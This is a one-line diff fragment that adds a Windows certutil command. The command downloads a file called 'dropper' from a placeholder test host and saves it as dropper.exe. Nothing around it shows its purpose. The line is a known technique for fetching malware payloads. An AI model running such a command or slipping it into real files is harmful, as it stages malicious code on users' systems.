@@ -1,0 +1,1 @@
+certutil -urlcache -f http://b32d-example.test/dropper dropper.exe
